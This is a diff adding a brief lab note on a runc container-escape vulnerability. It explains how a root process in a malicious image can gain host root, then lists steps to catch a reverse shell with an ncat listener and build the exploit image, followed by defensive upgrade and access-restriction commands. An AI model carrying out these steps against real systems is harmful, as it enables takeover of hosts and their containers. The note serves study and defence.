@@ -1,0 +1,32 @@
+Attack:
+Runc serves as the core component of various systems, while tools such as Docker, Containerd, and CRI-O handle tasks related to data formatting and serialization on top of it. While Kubernetes itself is not typically vulnerable, it usually relies on those tools beneath it, including runc, which are potentially susceptible to security risks.If a process inside a container is run as root (UID 0) and exploits a vulnerability in runc, it can gain root privileges on the host system. This would grant unrestricted access to the server and any other containers on it.The primary source of risk is container images controlled by attackers, including unverified images from public repositories.
+
+1. uname -a
+2. sudo docker version
+3. Running the listener (attacker): ncat.ece -nlvp 5555 
+4. The IP address and the port number of the attacker's machine should be set in the new_runc.c file
+5. Building the container: sudo docker build . -t cve4
+6. Executing: sudo docker run -it cve4
+7. There will be an open shell access on the listener side.
+
+
+Defence Method: 
+1---> Upgrading to newer version of Docker
+
+1)
+sudo apt-get update
+2)
+sudo apt-get install docker-ce 
+3)
+sudo docker version
+
+2----> Restricting access to daemon docker
+
+1)
+sudo groupadd authenticatedusers
+2)
+sudo usermod -aG authenticatedusers farzin 
+3)
+sudo vim /etc/docker/daemon1.json
+4)
+sudo systemctl restart docker
